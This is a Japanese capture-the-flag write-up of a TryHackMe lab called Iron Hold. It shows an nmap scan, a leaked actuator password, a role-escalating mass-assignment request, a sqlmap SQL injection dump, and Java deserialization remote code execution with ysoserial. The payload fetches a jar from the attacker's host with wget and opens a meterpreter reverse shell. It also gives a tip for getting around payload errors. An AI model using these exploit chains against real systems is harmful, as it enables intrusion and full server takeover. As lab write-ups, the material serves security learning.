# Iron Hold CTF

https://tryhackme.com/room/ironhold

## Enumeration

```shell
TARGET=10.146.159.224
sudo bash -c "echo $TARGET   iron.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 63
```

## actuator

application.properties でダンプ以外は有効な設定になっている。

```txt
management.endpoints.web.exposure.include=*
management.endpoints.web.exposure.exclude=heapdump,threaddump
```

http://iron.thm:8080/actuator

```json
{"_links":{"self":{"href":"http://iron.thm:8080/actuator","templated":false},"beans":{"href":"http://iron.thm:8080/actuator/beans","templated":false},"caches-cache":{"href":"http://iron.thm:8080/actuator/caches/{cache}","templated":true},"caches":{"href":"http://iron.thm:8080/actuator/caches","templated":false},"health":{"href":"http://iron.thm:8080/actuator/health","templated":false},"health-path":{"href":"http://iron.thm:8080/actuator/health/{*path}","templated":true},"info":{"href":"http://iron.thm:8080/actuator/info","templated":false},"conditions":{"href":"http://iron.thm:8080/actuator/conditions","templated":false},"configprops":{"href":"http://iron.thm:8080/actuator/configprops","templated":false},"configprops-prefix":{"href":"http://iron.thm:8080/actuator/configprops/{prefix}","templated":true},"env":{"href":"http://iron.thm:8080/actuator/env","templated":false},"env-toMatch":{"href":"http://iron.thm:8080/actuator/env/{toMatch}","templated":true},"loggers":{"href":"http://iron.thm:8080/actuator/loggers","templated":false},"loggers-name":{"href":"http://iron.thm:8080/actuator/loggers/{name}","templated":true},"metrics":{"href":"http://iron.thm:8080/actuator/metrics","templated":false},"metrics-requiredMetricName":{"href":"http://iron.thm:8080/actuator/metrics/{requiredMetricName}","templated":true},"scheduledtasks":{"href":"http://iron.thm:8080/actuator/scheduledtasks","templated":false},"mappings":{"href":"http://iron.thm:8080/actuator/mappings","templated":false}}}
```

/actuator/env

```json
"HOME": {
    "value": "/home/appuser",
    "origin": "System Environment Property \"HOME\""
},
"KIOSK_PW": {
    "value": "[REDACTED]",
    "origin": "System Environment Property \"KIOSK_PW\""
}
```


## login

ソース解析で気になった部分を抜粋する。

AuthController.java

```java
    @PostMapping("/login")
    public String login(@RequestParam String username,
                         @RequestParam String password,
                         HttpSession session,
                         Model model) {
        Staff staff = staffRepository.findByUsername(username);
        if (staff == null || !passwordEncoder.matches(password, staff.getPassword())) {
            model.addAttribute("error", "Invalid staff credentials.");
            return "login";
        }
        session.setAttribute(SessionUtil.USERNAME_KEY, staff.getUsername());
        return "redirect:/dashboard";
    }
```

DataAccessConfig.java

```java
@Configuration
public class DataAccessConfig {

    public static final String LOOKUP_USER = "ironhold_lookup";
    public static final String LOOKUP_PASSWORD = "Lk_r0_2091!";
```

staff.java

```java
    public boolean isWarden() {
        return "WARDEN".equalsIgnoreCase(role);
    }
```

DataSeeder.java

```java
    private List<Staff> seedStaff() {
        Staff kiosk = new Staff();
        kiosk.setUsername("kiosk");
        kiosk.setPassword(passwordEncoder.encode(kioskPassword));
        kiosk.setFullName("Shift Kiosk Account");
        kiosk.setEmail("kiosk@ironhold.example");
        kiosk.setBadgeNumber("K-000");
        kiosk.setRole("OFFICER");

        Staff warden = new Staff();
        warden.setUsername("warden");
        warden.setPassword(passwordEncoder.encode(wardenPassword));
        warden.setFullName("Warden E. Castellan");
        warden.setEmail("e.castellan@ironhold.example");
        warden.setBadgeNumber("W-001");
        warden.setRole("WARDEN");

        String fillerHash = passwordEncoder.encode("IronholdStaff2026!");
        String[][] officers = {
                {"j.reyes", "Officer J. Reyes", "O-104"},
                {"m.chen", "Officer M. Chen", "O-118"},
                {"a.osei", "Officer A. Osei", "O-129"},
                {"l.bianchi", "Officer L. Bianchi", "O-142"},
        };

        List<Staff> all = new java.util.ArrayList<>();
        all.add(staffRepository.save(kiosk));
        all.add(staffRepository.save(warden));
        for (String[] o : officers) {
            Staff officer = new Staff();
            officer.setUsername(o[0]);
            officer.setPassword(fillerHash);
            officer.setFullName(o[1]);
            officer.setEmail(o[0] + "@ironhold.example");
            officer.setBadgeNumber(o[2]);
            officer.setRole("OFFICER");
            all.add(staffRepository.save(officer));
        }
        return all;
    }

    private List<Inmate> seedInmates() {
        String[] firstNames = {"James", "Robert", "Michael", "David", "Marcus", "Elena", "Sofia",
                "Grace", "Daniel", "Victor", "Nadia", "Omar", "Isabel", "Lucas", "Theo",
                "Priya", "Hassan", "Ines", "Kenji", "Ruth"};
        String[] lastNames = {"Doyle", "Marsh", "Okafor", "Petrov", "Alvarez", "Winslow", "Kowalski",
                "Nakamura", "Fitzgerald", "Novak", "Brennan", "Delgado", "Hartley", "Solano",
                "Abara", "Vance", "Castillo", "Whitfield", "Duarte", "Reilly"};
        String[] blocks = {"A-Wing", "B-Wing", "C-Wing", "D-Wing"};
        String[] offenses = {"Burglary", "Fraud", "Grand Theft Auto", "Racketeering",
                "Forgery", "Extortion", "Arson", "Assault"};
        String[] statuses = {"ACTIVE", "ACTIVE", "ACTIVE", "SEGREGATION", "TRANSFERRED"};

        List<Inmate> inmates = new java.util.ArrayList<>();
        for (int i = 0; i < 20; i++) {
            Inmate inmate = new Inmate();
            inmate.setName(firstNames[i % firstNames.length] + " " + lastNames[(i * 3 + 1) % lastNames.length]);
            inmate.setBlock(blocks[i % blocks.length]);
            inmate.setCellNumber((100 + i * 3) + "");
            inmate.setOffense(offenses[i % offenses.length]);
            inmate.setAdmissionDate(LocalDate.of(2022 + (i % 4), 1 + (i % 12), 1 + (i % 27)));
            inmate.setStatus(statuses[i % statuses.length]);
            inmates.add(inmateRepository.save(inmate));
        }
        return inmates;
    }
```

発見したユーザー名とパスワードを使用。kiosk ユーザーとしてログインできた。（フラグ１）

## dashboard

プロフィール更新でロールをセットする処理がある。

```java
    @PostMapping("/profile/update")
    public String update(@ModelAttribute Staff staff, HttpSession session) {
        Staff current = staffRepository.findByUsername(SessionUtil.currentUsername(session));

        current.setFullName(staff.getFullName());
        current.setEmail(staff.getEmail());
        if (staff.getBadgeNumber() != null && !staff.getBadgeNumber().isBlank()) {
            current.setBadgeNumber(staff.getBadgeNumber());
        }
        if (staff.getRole() != null && !staff.getRole().isBlank()) {
            current.setRole(staff.getRole());
        }

        staffRepository.save(current);
        return "redirect:/profile";
    }
```

プロフィール更新画面からマスアサインメントでroleを設定することにより、admin画面を表示できた（フラグ３）

```http
POST /profile/update HTTP/1.1
Host: iron.thm:8080
Content-Length: 89
Cache-Control: max-age=0
Origin: http://iron.thm:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://iron.thm:8080/profile
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: JSESSIONID=7388418452C912DCFFAB28D27999E044

Connection: keep-alive

fullName=Shift+Kiosk+Account&email=kiosk%40ironhold.example&badgeNumber=K-000&role=WARDEN
```

## flag2

見逃していたフラグ２に戻る。

```sh
$ grep -R flag2 ./      
./main/resources/application.properties:app.flag2.secret=${FLAG2_SECRET}
./main/java/com/ironhold/seed/DataSeeder.java:    @Value("${app.flag2.secret}")
./main/java/com/ironhold/seed/DataSeeder.java:    private String flag2;
./main/java/com/ironhold/seed/DataSeeder.java:                "IA-2024-007", "Internal Affairs Review", flag2, "OPEN",
```

flag2 は CaseFile から参照されているが、それを参照する画面はない。  
SQLインジェクションでDBを直接読むことを考えた。

```sh
$ grep -R queryForList ./
./main/java/com/ironhold/controller/InmateController.java:            results = jdbcTemplate.queryForList("SELECT id, name, block FROM inmates");
./main/java/com/ironhold/controller/InmateController.java:            results = jdbcTemplate.queryForList(sql);
```

/inmates/search を攻撃したらDB名取得成功した。

```sh
$ sqlmap -r ./inmate-search.txt --dbs --batch

...
back-end DBMS: H2
[21:25:58] [INFO] fetching database names
available databases [2]:
[*] INFORMATION_SCHEMA
[*] PUBLIC
```

テーブル名と列名はソースを読んでわかっているのでダンプする。

```sh
$ sqlmap -r ./inmate-search.txt --dump -D PUBLIC -T CASE_FILES -C summary --batch
...
Database: PUBLIC
Table: CASE_FILES
[1 entry]
+---------------------------------+
| SUMMARY                         |
+---------------------------------+
| THM{[REDACTED]}                 |
+---------------------------------+
```

## import/exrpot

デシリアライズRCEを狙えそうな実装がある。

```java
@Controller
public class ImportExportController {

    private static final Logger log = LoggerFactory.getLogger(ImportExportController.class);

    @GetMapping("/admin/import")
    public String importPage() {
        return "admin-import";
    }

    @PostMapping(value = "/admin/import", consumes = MediaType.ALL_VALUE)
    @ResponseBody
    public ResponseEntity<String> importData(@RequestBody String body) {
        try {
            byte[] decoded = Base64.getDecoder().decode(body.trim());
            try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded))) {
                Object restored = ois.readObject();
                return ResponseEntity.ok("Batch accepted: " + restored.getClass().getSimpleName());
            }
        } catch (Exception e) {
            log.warn("Bulk import failed to deserialise: {}", e.toString());
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR)
                    .body("Import failed: batch could not be read.");
        }
    }
```

ping を試してみたがデシリアライズエラーとなった。おそらく、`2` の部分が原因。

```sh
$ java --add-opens=java.base/java.util=ALL-UNNAMED \                       
  -jar ysoserial-all.jar CommonsCollections6 \
  'ping -c 2 192.168.131.34' | base64 -w0 > payload.b64

$ curl -X POST http://iron.thm:8080/admin/import \ 
  -H "Cookie: JSESSIONID=3D1E020279667676294781255571840B" \
  --data-binary @payload.b64
Import failed: batch could not be read.
```

wget のリモート実行に成功。

```sh
$ java -jar ysoserial-all.jar CommonsCollections6 'wget http://192.168.131.34:8000/test' | base64 -w0 > payload.b64
                                                                            
                                                                            $ curl -X POST http://iron.thm:8080/admin/import \
  -H "Cookie: JSESSIONID=61015F0851707A084AE8CDDD6006F671" \
  -H "Content-Type: text/plain" \
  --data-binary @payload.b64
Batch accepted: HashSet
```

```sh
$ python -m http.server                                         
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.144.148.167 - - [19/Jul/2026 00:09:55] code 404, message File not found
10.144.148.167 - - [19/Jul/2026 00:09:55] "GET /test HTTP/1.1" 404 -
```

様々なリバースシェルを試したり、/home/appuser/.ssh/authorized_keys を出力したりしたがなかなか成功せず苦労した。

最終的に、jar で meterpreter を取れた！

```sh
$ java -jar ysoserial-all.jar CommonsCollections6 'wget http://192.168.131.34:8000/test.jar' | base64 -w0 > payload.b64

$ curl -X POST http://iron.thm:8080/admin/import \
  -H "Cookie: JSESSIONID=61015F0851707A084AE8CDDD6006F671" \
  -H "Content-Type: text/plain" \
  --data-binary @payload.b64
Batch accepted: HashSet                                                                     

$ java -jar ysoserial-all.jar CommonsCollections6 'java -jar test.jar' | base64 -w0 > payload.b64

$ curl -X POST http://iron.thm:8080/admin/import \                                               
  -H "Cookie: JSESSIONID=61015F0851707A084AE8CDDD6006F671" \
  -H "Content-Type: text/plain" \
  --data-binary @payload.b64
Batch accepted: HashSet
```

```sh
$ msfconsole -q -x "use exploit/multi/handler; set payload java/meterpreter/reverse_tcp; set LHOST 192.168.131.34; set LPORT 8888;exploit"
[*] Using configured payload generic/shell_reverse_tcp
payload => java/meterpreter/reverse_tcp
LHOST => 192.168.131.34
LPORT => 8888
[*] Started reverse TCP handler on 192.168.131.34:8888 
[*] Sending stage (58073 bytes) to 10.144.148.167
[*] Meterpreter session 1 opened (192.168.131.34:8888 -> 10.144.148.167:53904) at 2026-07-19 00:34:26 -0400

meterpreter > 
```

フラグを探す

```sh
cd /app
ls 
app.jar
busy.sh
docker-entrypoint.sh
py.sh
rev.sh
test.jar
ls -al .
total 42616                                                                                                         
drwxr-xr-x 1 appuser appuser     4096 Jul 19 04:34 .                                                                
drwxr-xr-x 1 root    root        4096 Jul 16 14:13 ..                                                               
-rw-r--r-- 1 appuser appuser 43603392 Jul 16 14:10 app.jar                                                          
-rwx------ 1 appuser appuser       37 Jul 19 04:13 busy.sh                                                          
-rwxr-xr-x 1 appuser appuser      296 Jul 10 20:41 docker-entrypoint.sh                                             
-rw------- 1 appuser appuser      219 Jul 19 04:15 py.sh                                                            
-rw------- 1 appuser appuser       77 Jul 19 04:12 rev.sh                                                           
-rw------- 1 appuser appuser     5264 Jul 19 04:33 test.jar                                                         
cat docker-entrypoint.sh                                                                                            
#!/bin/bash                                                                                                         
set -euo pipefail                                                                                                   
                                                                                                                    
mkdir -p /opt/ironhold                                                                                              
umask 077                                                                                                           
                                                                                                                    
[ -f /opt/ironhold/flag.txt ] && chmod 600 /opt/ironhold/flag.txt
printf '%s\n' "${FLAG4:?FLAG4 environment variable must be set}" > /opt/ironhold/flag.txt
chmod 400 /opt/ironhold/flag.txt

unset FLAG4

exec java -jar /app/app.jar
cat /opt/ironhold/flag.txt
THM{[REDACTED]}
```



## 振り返り

- ソースコードを与えられている方が闇雲に攻撃を試すよりもおもしろいと感じた。
- デシリアライズ時、2のような数字単体が含まれている場合など、デシリアライズでエラーになることがある。

```sh
'ping -c 2 192.168.131.34'
```

その場合、下記のような構文で回避できる可能性がある。

```sh
'sh -c {ping,-c,2,192.168.131.34}'
```

## Tags

#tags:Java #tags:Spring #tags:コードレビュー #tags:ysoserial #tags:デシリアライズ #tags:SQLインジェクション #tags:マスアサインメント
